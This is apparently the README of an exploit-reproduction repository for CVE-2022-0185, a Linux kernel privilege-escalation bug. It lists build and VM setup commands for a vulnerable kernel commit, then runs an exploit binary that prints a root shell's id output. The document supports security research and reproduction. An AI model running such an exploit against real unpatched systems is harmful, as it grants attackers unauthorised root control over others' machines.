# cve-2022-0185

## Environment

| Linux commit                             | .config            | Prots              | initramfs                        |
| ---------------------------------------- | ------------------ | ------------------ | -------------------------------- |
| 5650152ddab1a6b367e6804deea344e001bd656e | [config](./config) | [run.sh](./run.sh) | [cpio file](./initramfs.cpio.gz) |

### Setup

```bash
git clone https://cos.googlesource.com/third_party/kernel && cd kernel
git checkout 5650152ddab1a6b367e6804deea344e001bd656e
cp /path/to/config .config
make # or make bzImage
cp vmlinux /path/to/exploit_dir # or cp arch/x86/boot/bzImage ...

make local
./run.sh

# In vm
/exp
...
[+] Success!!!
/home/user # id
uid=0(root) gid=0(root) groups=0(root)
```

## References

- https://veritas501.github.io/2022_03_16-CVE_2022_0185%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8%E4%B8%8Epipe%E6%96%B0%E5%8E%9F%E8%AF%AD%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/
- https://www.willsroot.io/2022/01/cve-2022-0185.html
- https://dirtypipe.cm4all.com/
